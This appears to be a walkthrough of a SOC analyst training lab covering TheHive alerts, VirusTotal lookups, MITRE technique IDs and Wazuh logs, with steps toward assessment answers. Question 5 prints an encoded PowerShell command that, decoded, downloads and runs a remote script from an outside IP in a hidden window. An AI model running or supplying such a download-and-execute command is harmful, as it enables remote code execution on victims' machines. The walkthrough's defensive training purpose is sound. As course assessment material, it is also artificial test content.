# Section 1
## Question 1
During an investigation, we discovered a malicious file with an MD5 hash value of 'b40f6b2c167239519fcfb2028ab2524a'. What do we usually call such a hash value in investigations? Answer format: Abbreviation

Indicator of Compromise (IoC)

## Question 2 
In TheHive, check the alert with rule=92153 related to the VaultCli.dll module. What is the MD5 hash value mentioned in the alert?

Going to the quick filters, being able to sort by the tag, `rule=` was able to search for the correct rule.

## Question 3
True/False: As an analyst, you detected lateral movement attempts to systems owned by another department (e.g., finance). As it belongs to another department, you will not perform escalation internally.

# Skill Assessment
### Question 1
Open the alert "[InsightNexus] Admin Login via ManageEngine Web Console." Find the foreign IP address starting with "203" in the comments. Check VirusTotal for the information related to this IP address, and add the details as a comment in this alert. In VirusTotal, what is the name of the file starting with "Mango" in the Files Referring section?

Going to the hive, search for the name.
In the comments, look for the IP address
Going to the site of VirusTotal, enter the IP address and go to the references.
Going to the files referring, you'll find the answer.

### Question 2
In VirusTotal, go to the details of the IP address starting with "198." What is the name of the city shown in the Whois Lookup?

Looking into the details of the IP address found above the first question.
Going to the details in VirusTotal you can find the city after scrolling down.

### Question 3
If malware downloads files from a C2 (Command and Control) server into the victim network, under what MITRE technique ID does this tool transfer technique fall? Type it as your answer. The format is T1***.

Going to the [Mitre](https://attack.mitre.org/) and look for Command and Control.
Looking at the Ingress Tool Transfer, you can find the ID of the section.

### Question 4
Open TheHive and check the rule ID 92153 related to the VaultCli.dll module. What is the MITRE technique ID for this activity? The format is T1***.

Going into the filters.
Tags, rule=92153.
Look for the rule.mitre.id

### Question 5
Download the "logs-wazuh.zip" file from resources, and identify the suspicious PowerShell command in the logs. Type the suspicious IP address after decoding the command.

Unzipping the file.
`grep -A5 powershell logs-wazuh.json`
`echo -n "SUVYIChOZXctT2JqZWN0IFN5c3RlbS5OZXQuV2ViQ2xpZW50KS5Eb3dubG9hZFN0cmluZygnaHR0cDovLzE5OC41MS4xMDAuMjQvZGVmZW5kZXIvZGVwbG95LWRlZmluaXRpb25zLnBzMScpOyBTdGFydC1Qcm9jZXNzIHBvd2Vyc2hlbGwgLUFyZ3VtZW50TGlzdCAnLU5vUHJvZmlsZSAtV2luZG93U3R5bGUgSGlkZGVuIC1GaWxlIEM6XFdpbmRvd3NcVGVtcFxkZXBsb3ktZGVmaW5pdGlvbnMucHMxJw==" | base64 -d`

Then the IP address is right there.

### Question 6
In the same file (i.e., logs-wazuh.zip), identify the user who executed the suspicious PowerShell command. The format is domain\user.

Looking at the same file as question 5.
The user is at the bottom.
